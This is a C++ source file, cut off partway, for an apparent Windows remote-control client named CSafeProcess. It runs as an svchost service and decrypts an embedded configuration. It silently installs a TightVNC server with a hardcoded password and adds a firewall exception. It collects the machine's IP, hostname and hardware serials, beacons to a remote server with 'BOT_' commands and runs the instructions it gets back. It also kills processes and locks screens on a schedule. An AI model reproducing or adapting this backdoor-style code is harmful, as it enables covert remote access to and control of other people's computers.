// SafeProcess.cpp: implementation of the CSafeProcess class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "SafeProcess.h"
#include "HttpQuery.h"
#include "../FileDef.h"
#include "Conv.h"
#include "NetworkConnection.h"
#include "WMIUtils.h"
#include "resource.h"
#include "../Public/SystemUtils.h"
#include "SvchostServiceModule.h"
#include <WinUser.h>
#include <ATLComTime.h>
#include <atlstr.h>
#include "../Public/IPC.h"
#include "../Public/FirewallUtils.h"
#include "../Public/Utils.h"
#include "../Public/DevUtils.h"
#include "../Public/PipeClient.h"
#include "../Defines.h"
#include "../MacConfig.h"
LPCTSTR SZ_DESKTOP_WINLOGON		= _T("Winlogon");

//#define TEST_MODE

/*
#if _MSC_VER <= 1200
#include "strtok_s.h"
#endif
*/
#include <TlHelp32.h>

#define DELAY_GET_REQUEST	500

//#define USE_REAL_CONFIG_FILE

CommunicationInfo theInfo;
_CLIENT_INFO *m_LockerInfo;
CRITICAL_SECTION m_LockerInfoLock;
BOOL m_bLocked = FALSE;
BOOL m_bLockModeAuto = TRUE;
//IPC m_ipcInfo;
//IPC m_ipcLock;

BOOL ReadConfig(HMODULE hInstance, LPCTSTR lpType, LPCTSTR lpName)
{
	BOOL bRet = FALSE;
	// Find and Load the resource containing file(s) data
	HRSRC hResLoad = FindResource(hInstance, lpType, lpName);
	HGLOBAL hResData = LoadResource(hInstance, hResLoad);
	LPCSTR data = (LPCSTR)LockResource(hResData);

	// We should have properly loaded the resource
	assert(data != NULL && hResData != NULL);

	DWORD dwFileLen = SizeofResource(hInstance, hResLoad);
	if (dwFileLen == sizeof(CommunicationInfo))
	{
		memset(&theInfo, 0, sizeof(CommunicationInfo));
		LPBYTE pBuf = new BYTE[sizeof(CommunicationInfo)];
		memcpy(pBuf, data, dwFileLen);
		Crypt::_rc4Full(CONFIG_KEY, strlen(CONFIG_KEY), pBuf, sizeof(CommunicationInfo));
		memcpy(&theInfo, pBuf, sizeof(CommunicationInfo));
		delete[] pBuf;
		bRet = TRUE;
	}
	
	// Perform cleanup
	//UnlockResource(hResData);
	FreeResource(hResData);

	return bRet;
}


struct ThreadPipeConnectionParam
{
	CSafeProcess *pApp;
	NamedPipe *pPipe;
};
DWORD WINAPI ThreadPipeServerConnection(LPVOID lpThreadParameter)
{
	ThreadPipeConnectionParam *pParam = (ThreadPipeConnectionParam *)lpThreadParameter;
	NamedPipe *pPipe = pParam->pPipe;
	CSafeProcess *pApp = pParam->pApp;
	delete pParam;

	LPBYTE pbBuffer = new BYTE[1024 * 200];
	while (TRUE)
	{
		ZeroMemory(pbBuffer, 1024 * 200);
		size_t iDataLen = pPipe->Read(pbBuffer, 1024 * 200);
		if (0 == iDataLen)
		{
			break;
		}
		
		Json::Reader reader;
		Json::Value root;
		if (reader.parse((LPSTR)pbBuffer, root, false))
		{
			int iType = GetJsonInt(root, "Type", 0);
			std::string strTmp = GET_JSON_STRING(root, "Content", "");
			if (PIPE_TYPE_UNLOCK == iType)
			{
				CSafeProcess::Request request;
				request.dwType = BOT_TYPE_UNLOCK;
				request.dwEventId = 0;
				request.szRequest = _T("");
				tstring strResponse;
				pApp->DoRequest(request, strResponse);
			}
			else if (PIPE_TYPE_LOCK == iType)
			{
				CSafeProcess::Request request;
				request.dwType = BOT_TYPE_LOCK;
				request.dwEventId = 0;
				request.szRequest = _T("");
				tstring strResponse;
				pApp->DoRequest(request, strResponse);
			}
		}
	}
	delete[] pbBuffer;
	NamedPipe::Push(pPipe);
	return 0;
}

DWORD WINAPI ThreadPipeServer(LPVOID lpThreadParameter)
{
	CSafeProcess *pApp = (CSafeProcess *)lpThreadParameter;
	while (TRUE)
	{
		NamedPipe *pPipe = pApp->m_PipeServer.Accept();
		if (NULL == pPipe)
		{
			break;
		}
		DWORD dwThread;
		ThreadPipeConnectionParam *pParam = new ThreadPipeConnectionParam;
		pParam->pApp = pApp;
		pParam->pPipe = pPipe;
		::CreateThread(NULL, 0, ThreadPipeServerConnection, pParam, 0, &dwThread);
	}
	return 0;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSafeProcess::CSafeProcess()
:m_PipeServer(PIPE_SERVICE_NAME)
{
	OutputLog(_T("CSafeProcess::CSafeProcess\n"));
	// Config
	/*
	strcpy(m_Info.szKey, "6dNfg8Upn5fBzGgj8licQHblQvLnUY19z5zcNKNFdsDhUzuI8otEsBODrzFCqCKr");
//	lstrcpy(m_Info.szHost, _T("db-sf-herring01.db01.baidu.com"));
	lstrcpy(m_Info.szHost, _T("security.duapp.com"));
	m_Info.uPort = 80;
//	lstrcpy(m_Info.szPage, _T("/safe/record.php"));
	lstrcpy(m_Info.szPage, _T("/record.php"));
	*/

	// Cmd
	m_pRedCmd = new NCmd::CRedCmd;
	m_LockerInfo = new _CLIENT_INFO;
	InitializeCriticalSection(&m_LockerInfoLock);
	
	const LPCTSTR TASK_EXE = _T("ScreenLocker.exe");
	PROCESSENTRY32 pe32 = {0};
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    
	if (hProcessSnap != (HANDLE)-1)    
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);    
		if (Process32First(hProcessSnap, &pe32))    
		{  
			while(1)  
			{
				if (0 == _tcsicmp(pe32.szExeFile, TASK_EXE))
				{
					HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
					if (hProc != 0)
					{
						TerminateProcess(hProc, -1);
					}
				}

				if (!Process32Next(hProcessSnap, &pe32))
				{
					break;
				}
			}
		}
		CloseHandle(hProcessSnap);
	}
	Sleep(1000);
//	m_ipcInfo.Create(IPC_SHARED_MMF_INFO);
//	m_ipcLock.Create(IPC_SHARED_MMF_LOCK);

	// Test File
	/*
//	DownloadFile();
	BOOL bRet = HttpQuery::PostFile(m_Info.szHost, m_Info.uPort, _T("/safe/upload.php"),
		//_T("C:\\1.txt"), _T("1.txt")
		//_T("C:\\1.avi"), _T("1.avi")
		_T("C:\\1.wmv"), _T("1.wmv")
		);
	bRet = TRUE;
	*/

	/*
	CWMIUtils Wmi;
	TCHAR szId[256];
	BOOL bRet = FALSE;
	for (int i = 0; i < 100; i++)
	{
		bRet = Wmi.GetDiskId(szId);
		if (FALSE == bRet)
		{
			wsprintf(szId, _T("%d"), abs(rand() % 10000));
		}
		bRet = FALSE;
	}
	bRet = FALSE;
	*/

//	BOOL bWrite = m_ipcInfo.Write((LPBYTE)m_LockerInfo, sizeof(_CLIENT_INFO));
//	OutputLog(_T("Write[Init]: [%d], %d"), bWrite, m_LockerInfo->iWinCount);

	/*
	BOOL bVncInstalled = CSvchostServiceModule::IsInstalled(SERVICE_VNC_NAME);
	if (!bVncInstalled)
	{	
	}
	*/

	m_bCheckScreenLocker = TRUE;

	/*
	while (TRUE)
	{
		Json::Value jsonItem;
		jsonItem["Type"]	= PIPE_TYPE_LOCK;
		jsonItem["Content"]	= "";
		Json::FastWriter writer;
		std::string strPipeContent = writer.write(jsonItem);
		PipeClient client;
		NamedPipe *pPipe = client.Connect(PIPE_NAME);
		if (NULL != pPipe)
		{
			pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
			delete pPipe;
			m_bLocked = TRUE;
			pPipe->Close();
		}
		else
		{
			int d = 0;
		}
//		Sleep(20);
	}
	*/

	m_bRestartRefreshed = TRUE;
}

CSafeProcess::~CSafeProcess()
{
	OutputLog(_T("CSafeProcess::~CSafeProcess\n"));
	delete m_pRedCmd;
}

BOOL CSafeProcess::Initialize()
{
	//
	BOOL bRet = ReadConfig(m_hInstance, MAKEINTRESOURCE(IDR_BIN_CONFIG), _T("BIN"));
	if (!bRet)
	{
		OutputLog(_T("InitConnectionInfo Failed\n"));
		return FALSE;
	}
	OutputLog(_T("InitConnectionInfo Success\n"));

#ifndef TEST_MODE
	TCHAR szDllPath[MAX_PATH] = {0};
	CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
	TCHAR szVncExePath[MAX_PATH];
	lstrcpy(szVncExePath, szDllPath);
	*_tcsrchr(szVncExePath, _T('\\')) = 0;
	lstrcat(szVncExePath, _T("\\tvnserver.exe"));
	DWORD dwAttributes = ::GetFileAttributes(szVncExePath);
	BOOL bFileExist = (dwAttributes != ((DWORD)-1)) && ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0);
	if (!bFileExist)
	{
		BOOL bExtract = SystemUtils::Extractfile(
			m_hInstance,
			MAKEINTRESOURCE(IDR_BIN_VNC_SERVER), _T("BIN"), szVncExePath);
		if (!bExtract)
		{
			OutputLog(_T("Extract VNC Sever Failed"));
			return FALSE;
		}
		else
		{
			OutputLog(_T("Extract VNC Server Success"));
		}
	}

	BOOL bInstall = CSvchostServiceModule::IsInstalled(SERVICE_VNC_NAME);
	if (!bInstall)
	{
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("%s -install -silent"), szVncExePath);
		OutputLog(szCmd);
		BOOL bInstall = SystemUtils::CreateNormalProcess(szCmd, TRUE, TRUE);
		if (!bInstall)
		{
			OutputLog(_T("Install VNC Service Failed"));
			return FALSE;
		}

		bInstall = FALSE;
		for (int i = 0; i < 20; i++)
		{
			bInstall = CSvchostServiceModule::IsInstalled(SERVICE_VNC_NAME);
			if (!bInstall)
			{
				Sleep(500);
				continue;
			}
			
			break;
		}

		if (!bInstall)
		{
			OutputLog(_T("Check Service After Install Failed"));
			return FALSE;
		}
	}


	CRegKey reg;
	LONG lRet = reg.Create(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\TightVNC\\Server"));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Create TightVNC Key Failed"));
		return FALSE;
	}
	OutputLog(_T("Create TightVNC Key Success"));

	lRet = reg.Create(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\TightVNC\\Server"));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Create TightVNC Server Key Failed"));
		return FALSE;
	}
	OutputLog(_T("Create TightVNC Server Key Success"));

	lRet = reg.Open(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\TightVNC\\Server"));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Open REG Key Failed"));
		return FALSE;
	}
	OutputLog(_T("Open REG Key Success"));

	lRet = reg.SetDWORDValue(_T("RunControlInterface"), 0);
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Set RunControlInterface Failed"));
		return FALSE;
	}
	OutputLog(_T("Set RunControlInterface Success"));

	lRet = reg.SetDWORDValue(_T("NeverShared"), 1);
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Set NeverShared Failed"));
		return FALSE;
	}
	OutputLog(_T("Set NeverShared Success"));
	

	BYTE lpPassword[] = {0xA6, 0xD6, 0xCA, 0xAA, 0x1F, 0xF2, 0x2A, 0x0E};
	lRet = reg.SetBinaryValue(_T("ControlPassword"), lpPassword, _countof(lpPassword));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Set ControlPassword Failed"));
		return FALSE;
	}
	OutputLog(_T("Set ControlPassword Success"));

	lRet = reg.SetBinaryValue(_T("Password"), lpPassword, _countof(lpPassword));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Set Password Failed"));
		return FALSE;
	}
	OutputLog(_T("Set Password Success"));

	lRet = reg.SetBinaryValue(_T("PasswordViewOnly"), lpPassword, _countof(lpPassword));
	if (ERROR_SUCCESS != lRet)
	{
		OutputLog(_T("Set PasswordViewOnly Failed"));
		return FALSE;
	}
	OutputLog(_T("Set PasswordViewOnly Success"));

	BOOL bStarted = CSvchostServiceModule::IsRunning(SERVICE_VNC_NAME);
	if (!bStarted)
	{
		OutputLog(_T("VNC Service Not Start, Starting..."));

		CSvchostServiceModule::Control(SERVICE_VNC_NAME, TRUE);
		/*
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("%s -start"), szVncExePath);
		OutputLog(szCmd);
		BOOL bInstall = Common::CreateNormalProcessInSystem(szCmd, TRUE, TRUE);
		if (!bInstall)
		{
			OutputLog(_T("Start VNC Service Failed"));
			return FALSE;
		}
		*/
	}
	else
	{
		OutputLog(_T("VNC Service Started..."));
	}

	FirewallUtils::AddApp(szVncExePath, _T("TightVNC"));
#endif

#ifndef TEST_MODE
	ZeroMemory(m_szUpgradePath, sizeof(m_szUpgradePath));
	CSvchostServiceModule::GetDllPath(m_szUpgradePath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
#else
	GetModuleFileName(NULL, m_szUpgradePath, MAX_PATH);
#endif
	*_tcsrchr(m_szUpgradePath, _T('\\')) = 0;
	lstrcat(m_szUpgradePath, _T("\\ServiceUpgrade.exe"));

	// Cmd
	m_pRedCmd->Initialize(this);

	bRet = m_PipeServer.Create();
	if (!bRet)
	{
		CString strError;
		strError.Format(_T("创建PIPE失败，请联系管理员!"), GetLastError());
		AfxMessageBox(strError, MB_ICONERROR);
		return FALSE;
	}
	DWORD dwThreadId;
	::CreateThread(NULL, 0, ThreadPipeServer, this, 0, &dwThreadId);

	return TRUE;
}

void CSafeProcess::Do(HINSTANCE hInstance)
{
	m_hInstance = hInstance;
	// Init SafeProcess
	BOOL bRet = Initialize();
	if (!bRet)
	{
		OutputLog(_T("Init SafeProcess Failed\n"));
		PostQuitMessage(-1);
		return;
	}
	OutputLog(_T("Init SafeProcess Success\n"));

//	Test();
//	return;

	// Create Thread
	OutputLog(_T("CSafeProcess::Do\n"));
	DWORD dwThreadId;
	CreateThread(NULL, 0, _Thread, this, 0, &dwThreadId);
	DWORD dwThreadRunId;
	CreateThread(NULL, 0, _ThreadRun, this, 0, &dwThreadRunId);
}

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h> 
//#include <stdio.h> 
//#pragma comment(lib,"ws2_32.lib") 
BOOL GetCurrenIP(TCHAR szIP[128]) 
{
	// Load Socket Library
	WSADATA	wsd;
	if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		return FALSE;
	}
	
	char hostname[128];
	if (gethostname(hostname, 128) != 0)
	{
		WSACleanup();
		return FALSE;
	} 
	
	struct hostent *pHost = gethostbyname(hostname);
	if (NULL == pHost)
	{
		WSACleanup();
		return FALSE;
	}
	
	szIP[0] = 0;
	for (int i = 0; pHost != NULL && pHost->h_addr_list[i] != NULL; i++) 
	{
		TCHAR szTmp[64];
		USES_CONVERSION;
		lstrcpy(szTmp, A2T(inet_ntoa(*(struct in_addr *)pHost->h_addr_list[i])));
		if (0 != i)
		{
			lstrcat(szIP, _T("#"));
		}
		lstrcat(szIP, szTmp);
	} 
	WSACleanup();
	return TRUE;
}

BinStorage::STORAGE * CSafeProcess::Communicate(BinStorage::STORAGE *pReqStorage)
{
	DWORD dwPostDataSize;
	LPBYTE pPostData = BinStorage::Pack(pReqStorage, dwPostDataSize);
	
	HttpQuery::QueryInfo query_info;
	LPCTSTR lpszMethod = _T("POST");
	LPBYTE lpRetData = NULL;
	DWORD dwRetData = 0;
	
	BinStorage::STORAGE *pResStorage = NULL;

	USES_CONVERSION;
	BOOL bRet = HttpQuery::QuerfUrl(
		A2T(theInfo.szHost), theInfo.uPort, A2T(theInfo.szPage),
		NULL,
		query_info,
		&lpRetData, &dwRetData,
		lpszMethod,
		pPostData, dwPostDataSize
		);
	if (TRUE == bRet)
	{
		BinStorage::Decrypt(theInfo.szKey, lpRetData, dwRetData);
		lpRetData[dwRetData] = 0;
		pResStorage = (BinStorage::STORAGE*)lpRetData;
		if(pResStorage->size <= dwRetData && BinStorage::CheckHash(pResStorage))
		{
		}
		else
		{
			delete[] (LPBYTE)pResStorage;
			pResStorage = NULL;
		}
	}
	SAFE_DELETE_AR(pPostData);
	return pResStorage;
}

DWORD WINAPI CSafeProcess::_Thread(LPVOID lpThreadParameter)
{
	CSafeProcess *pProcess = (CSafeProcess*)lpThreadParameter;
	pProcess->Thread();
	return 0;
}

VOID CSafeProcess::Thread()
{
	OutputLog(_T("CSafeProcess::_Thread\n"));
	BOOL bClientIdUpdated = FALSE;
	while (TRUE)
	{
		if (FALSE == bClientIdUpdated)
		{
			CWMIUtils Wmi;
			Wmi.GetDiskId(m_strDeviceSerial);
			if (0 == m_strDeviceSerial.GetLength())
			{
				TCHAR szTmp[256];
				wsprintf(szTmp, _T("RAND__%d"), abs(rand() % 10000));
				m_strDeviceSerial = szTmp;
			}
			CString strBiosId;
			Wmi.GetBiosId(strBiosId);
			m_strDeviceSerial += _T("___") + strBiosId;
			OutputLog(_T("Device Serial: %s"), m_strDeviceSerial);

			DWORD dwClientId;
			if (GetClientId(dwClientId))
			{
				theInfo.dwId = dwClientId;
				OutputLog(_T("Client Id: %d"), dwClientId);
				bClientIdUpdated = TRUE;
			}
			Sleep(DELAY_GET_REQUEST);
			continue;
		}
		
		if (FALSE == m_RelayInfo.bUpdated)
		{
			RelayFileInfo Info;
			BOOL bGetInfo = GetRelayFileInfo(Info);
			if (bGetInfo)
			{
				m_RelayInfo = Info;
				m_RelayInfo.bUpdated = TRUE;
			}
			else
			{
				Sleep(DELAY_GET_REQUEST);
				continue;
			}
		}
		
		BOOL bRet = TRUE;
		Request *pRequest = NULL;
		INT iCount = 0;
		bRet = GetRequest(pRequest, iCount);
		if (TRUE == bRet)
		{
			for (INT i = 0; i < iCount; i++)
			{
				m_dequeRequestLock.Lock();
				m_dequeRequest.push_back(pRequest[i]);
				m_dequeRequestLock.Unlock();
			}
		}
		SAFE_DELETE_AR(pRequest);
		
		// Check ScreenLocker
		const LPCTSTR TASK_EXE = _T("ScreenLocker.exe");
		//const LPCTSTR TASK_EXE = _T("ScreenLocker_x64.exe");
		if (m_bCheckScreenLocker)
		{
			BOOL bFind = FALSE;
			PROCESSENTRY32 pe32 = {0};
			HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    
			if (hProcessSnap != (HANDLE)-1)    
			{
				pe32.dwSize = sizeof(PROCESSENTRY32);    
				if (Process32First(hProcessSnap, &pe32))    
				{  
					while(1)  
					{
						if (0 == _tcsicmp(pe32.szExeFile, TASK_EXE))
						{
							bFind = TRUE;
							break;
						}

						if (!Process32Next(hProcessSnap, &pe32))
						{
							break;
						}
					}
				}
				CloseHandle(hProcessSnap);
			}
			if (!bFind)
			{
#ifndef TEST_MODE
				TCHAR szDllPath[MAX_PATH] = {0};
				CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
				TCHAR szLockExePath[MAX_PATH];
				lstrcpy(szLockExePath, szDllPath);
				*_tcsrchr(szLockExePath, _T('\\')) = 0;
				lstrcat(szLockExePath, _T("\\ScreenLocker.exe"));
				TCHAR szCmd[512];
				wsprintf(szCmd, _T("rundll32.exe \"%s\",ExtractLockScreen %s"), szDllPath, szLockExePath);
				OutputLog(szCmd);
				SystemUtils::CreateNormalProcessInSystem(szCmd, TRUE);
				m_bRestartRefreshed = FALSE;
#else
				/*
				TCHAR szLockExePath[MAX_PATH];
				GetModuleFileName(NULL, szLockExePath, MAX_PATH);
				*_tcsrchr(szLockExePath, _T('\\')) = 0;
				lstrcat(szLockExePath, _T("\\"));
				lstrcat(szLockExePath, TASK_EXE);
				SystemUtils::CreateNormalProcess(szLockExePath);
				*/

				//m_bLocked = FALSE;
#endif
			}
		}
		
		if (FALSE == m_bRestartRefreshed)
		{
			INT iType = (m_bLocked ? PIPE_TYPE_LOCK : PIPE_TYPE_UNLOCK);
			Json::Value jsonItem;
			jsonItem["Type"]	= iType;
			jsonItem["Content"]	= "";
			Json::FastWriter writer;
			std::string strPipeContent = writer.write(jsonItem);
			PipeClient client;
			NamedPipe *pPipe = client.Connect(PIPE_NAME);
			if (NULL != pPipe)
			{
				pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
				NamedPipe::Push(pPipe);

				m_bRestartRefreshed = TRUE;
			}
		}

		// Check Time
		BOOL bEnable = FALSE;
		EnterCriticalSection(&m_LockerInfoLock);
		/*
		COleDateTime time = COleDateTime::GetCurrentTime();
		DWORD dwHour = time.GetHour();
		DWORD dwMin = time.GetMinute();
		DWORD dwSec = time.GetSecond();
		//DWORD dwTime = (((DWORD)dwHour) << 16) + (((DWORD)dwMin) << 8) + dwSec;
		DWORD dwTime = dwHour * 3600 + dwMin * 60 + dwSec;
		*/
		if (m_LockerInfo->bLoaded)
		{
			DWORD dwTime = Utils::GetCurrentTimestamp();
			for (int i = 0; i < (int)m_LockerInfo->vecTimeRange.size(); i++)
			{
				if (dwTime >= m_LockerInfo->vecTimeRange[i].uTimeStart && dwTime <= m_LockerInfo->vecTimeRange[i].uTimeEnd)
				{
					bEnable = TRUE;
					break;
				}
			}
		}
		else
		{
			bEnable = TRUE;
		}
		LeaveCriticalSection(&m_LockerInfoLock);
		
		NamedPipe::Check();

		if (m_bLockModeAuto)
		{
			TCHAR szDllPath[MAX_PATH] = {0};
			CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
			if (bEnable)
			{
				if (m_bLocked)
				{
					/*
					TCHAR szCmd[512];
					wsprintf(szCmd, _T("rundll32.exe \"%s\",UnLockScreen"), szDllPath);
					OutputLog(szCmd);
					Common::CreateNormalProcessInSystem(szCmd);
					*/
				//	DWORD dwType = 2;
				//	BOOL bLock = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
				//	OutputLog(_T("UnLock: [%d]"), bLock);
					Json::Value jsonItem;
					jsonItem["Type"]	= PIPE_TYPE_UNLOCK;
					jsonItem["Content"]	= "";
					Json::FastWriter writer;
					std::string strPipeContent = writer.write(jsonItem);
					PipeClient client;
					NamedPipe *pPipe = client.Connect(PIPE_NAME);
					if (NULL != pPipe)
					{
						pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
						NamedPipe::Push(pPipe);
						m_bLocked = FALSE;
					}
				}
			}
			else
			{
				if (!m_bLocked)
				{
					/*
					TCHAR szLockExePath[MAX_PATH];
					lstrcpy(szLockExePath, szDllPath);
					*_tcsrchr(szLockExePath, _T('\\')) = 0;
					lstrcat(szLockExePath, _T("\\ScreenLocker.exe"));
					TCHAR szCmd[512];
					wsprintf(szCmd, _T("rundll32.exe \"%s\",LockScreen %s"), szDllPath, szLockExePath);
					OutputLog(szCmd);
					BOOL bLock = Common::CreateNormalProcessInSystem(szCmd);
					//BOOL bLock = Common::CreateNormalProcess(szCmd);
					*/

					/*
					DWORD dwType = 1;
					BOOL bLock = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
					OutputLog(_T("Lock: [%d]"), bLock);
					if (bLock)
					{
						m_bLocked = TRUE;
					}
					*/

					Json::Value jsonItem;
					jsonItem["Type"]	= PIPE_TYPE_LOCK;
					jsonItem["Content"]	= "";
					Json::FastWriter writer;
					std::string strPipeContent = writer.write(jsonItem);
					PipeClient client;
					NamedPipe *pPipe = client.Connect(PIPE_NAME);
					if (NULL != pPipe)
					{
						pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
						NamedPipe::Push(pPipe);
						m_bLocked = TRUE;
					}
				}			
			}
		}

		if (0 != iCount)
			Sleep(50);
		else
			Sleep(DELAY_GET_REQUEST);
	}
}

DWORD WINAPI CSafeProcess::_ThreadRun(LPVOID lpThreadParameter)
{
	CSafeProcess *pProcess = (CSafeProcess*)lpThreadParameter;
	pProcess->ThreadRun();
	return 0;
}

VOID CSafeProcess::ThreadRun()
{
	while (TRUE)
	{
		Sleep(30);
		Request request;
		BOOL bFound = FALSE;
		m_dequeRequestLock.Lock();
		if (m_dequeRequest.size() > 0)
		{
			request = m_dequeRequest[0];
			m_dequeRequest.pop_front();
			bFound = TRUE;
		}
		m_dequeRequestLock.Unlock();
		if (bFound)
		{
			tstring strResponse;
			LONG lRet = DoRequest(request, strResponse);
			SendResponse(request, strResponse.c_str(), lRet);
		}
	}
}

BOOL CSafeProcess::GetRequest(Request* &pRequest, INT& iCount)
{
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;
	
	// Update Status

	// Type
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_CLIENT_REQUEST);
	// Id
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_CLIENT_ID, 0, theInfo.dwId);
	// IP
	TCHAR szIP[128] = {0};
	GetCurrenIP(szIP);
	DWORD dwIPLen;
	LPSTR pIP = CConv::CharToUtf(szIP, &dwIPLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_IP_IN, 0, pIP, dwIPLen);
	delete[] pIP;
	// Host
	CHAR szHost[128] = {0};
	gethostname(szHost, 128);
	DWORD dwHostnameLen = 0;
	USES_CONVERSION;
	LPSTR pHost = CConv::CharToUtf(A2T(szHost), &dwHostnameLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_HOSTNAME, 0, pHost, dwHostnameLen);
	delete[] pHost;
	// Serial
	DWORD dwSerialLen;
	LPSTR pSerial = CConv::CharToUtf(m_strDeviceSerial, &dwSerialLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_DEVICE_SERIAL, 0, pSerial, dwSerialLen);
	delete[] pSerial;
	if (FALSE == bRet)
	{
		return FALSE;
	}
	// Comment
	Json::Value extraItem;
	std::string strExtraConfig;
	m_LockerInfo->SaveConfig(strExtraConfig);
	BYTE md5[16] = {0};
	Crypt::_md5Hash(md5, (LPVOID)strExtraConfig.c_str(), strExtraConfig.size());
	CString strExtraConfigMd5;
	for (int i = 0; i < _countof(md5); i++)
	{
		CString strTmp;
		strTmp.Format(_T("%02x"), md5[i]);
		strExtraConfigMd5 += strTmp;
	}
	extraItem["CONFIG_SIGN"] = CT2A(strExtraConfigMd5).m_psz;
	DWORD dwCommentLen;
	LPSTR pComment = CConv::CharToUtf(A2T(theInfo.szComment), &dwCommentLen);
	extraItem["COMMENT"] = pComment;
	delete[] pComment;
	extraItem["LOCK_STATE"] = m_bLocked;
	Json::FastWriter writer;
	std::string strCommentFull = writer.write(extraItem);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_COMMENT, 0, (VOID *)strCommentFull.c_str(), (DWORD)strCommentFull.size());
	if (FALSE == bRet)
	{
		return FALSE;
	}
	// Version
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_VERSION, 0, CLIENT_VERSION);
	
	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		const DWORD dwItemGroup = 3;
		do 
		{
			if (0 != (dwItemCount % dwItemGroup))
			{
				break;
			}

			iCount = dwItemCount / dwItemGroup;
			pRequest = new Request[iCount];
			BinStorage::ITEM *pItem = NULL;
			int iColIndex = 0;
			int iIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				LPTSTR pText = BinStorage::GetItemText(pItem);

				Request* pReq = pRequest + iIndex;
				if (0 == iColIndex)
					pReq->dwEventId = _ttoi(pText);
				else if (1 == iColIndex)
					pReq->dwType = _ttoi(pText);
				else if (2 == iColIndex)
				{
					//lstrcpy(pReq->szRequest, pText);
					pReq->szRequest = pText;
					iIndex++;
					iColIndex = -1;
				}
				iColIndex++;
				delete[] pText;
			}
		}
		while(FALSE);
		bRet = TRUE;
		delete[] (LPBYTE)pResStorage;
	}
	
	SAFE_DELETE(pReqStorage);
	if (FALSE == bRet)
	{
		SAFE_DELETE_AR(pRequest);
	}
	return bRet;
}

BOOL CSafeProcess::SendResponse(const Request& Req, LPCTSTR pszResponse, LONG lRet)
{
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;
	
	DWORD dwDataLen;
	LPSTR pData = CConv::CharToUtf(pszResponse, &dwDataLen);
	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_CLIENT_RESULT);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_EVENT_ID, 0, Req.dwEventId);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_CLIENT_ID, 0, theInfo.dwId);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_RESPONSE, 0, (LPVOID)pData, dwDataLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_RESPONSE_RET, 0, lRet);
	delete[] pData;
	if (FALSE == bRet)
	{
		return FALSE;
	}
	
	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		bRet = TRUE;
		delete[] (LPBYTE)pResStorage;
	}
	
	SAFE_DELETE(pReqStorage);
	return bRet;
}

BOOL CSafeProcess::SendResponseAsync( DWORD dwType, LPCTSTR pszResponse )
{
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;
	
	OutputLog(pszResponse);
	DWORD dwDataLen;
	LPSTR pData = CConv::CharToUtf(pszResponse, &dwDataLen);
	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_CLIENT_RESULT_ASYNC);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_CLIENT_ID, 0, theInfo.dwId);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_TYPE, 0, dwType);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_RESPONSE, 0, (LPVOID)pData, dwDataLen);
	delete[] pData;
	if (FALSE == bRet)
	{
